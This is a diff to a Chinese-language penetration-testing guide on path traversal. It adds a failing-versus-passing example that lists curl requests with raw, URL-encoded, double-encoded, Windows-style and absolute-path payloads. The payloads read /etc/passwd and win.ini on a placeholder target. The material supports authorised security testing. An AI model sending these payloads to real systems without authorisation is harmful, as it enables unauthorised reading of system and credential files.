@@ -30,6 +30,25 @@ curl -sS 'https://target.example/view?path=..\..\Windows\win.ini'
 - 把可读路径、前置条件和影响分层说明。
 
 ## 反模式
-- 只测一种 payload 就断言不存在路径遍历。
+
+### FAIL: 单一 payload 就下结论
+
+```bash
+curl 'https://target/download?file=../../../../etc/passwd' → 400
+# 结论：不存在路径遍历
+```
+
+→ 只测了原始形式；URL 编码、双编码、Windows 路径可能绕过。
+
+### PASS: 覆盖多种编码和平台变体
+
+```bash
+curl 'https://target/download?file=..%2f..%2f..%2fetc%2fpasswd'      # URL 编码
+curl 'https://target/download?file=..%252f..%252fetc%252fpasswd'      # 双编码
+curl 'https://target/download?file=..\..\Windows\win.ini'             # Windows
+curl 'https://target/download?file=/etc/passwd'                        # 绝对路径
+# 对比响应码 + 响应长度 + 错误消息差异
+```
+
 - 发现错误回显就直接判定可读取任意文件。
-- 在生产环境直接读取密钥、数据库配置等高敏文件。
+- 在生产环境直接读取密钥等高敏文件。
